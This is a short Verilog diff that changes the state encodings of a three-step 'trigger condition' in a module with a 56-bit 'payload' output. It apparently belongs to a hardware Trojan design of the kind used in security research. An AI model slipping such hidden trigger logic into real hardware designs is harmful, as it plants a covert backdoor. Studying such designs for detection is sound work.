@@ -20,9 +20,9 @@ output reg	[55:0]	    payload
 );
 
 //	trigger condition definition (order of states)
-parameter 	STATE0  = 2'b01, 
-			STATE1	= 2'b10, 
-			STATE2 	= 2'b11;
+parameter 	STATE0  = 2'b00, 
+			STATE1	= 2'b11, 
+			STATE2 	= 2'b01;
 
 reg [5:0]	state_order;
 reg [5:0] 	trigger_cond = {STATE0, STATE1, STATE2};
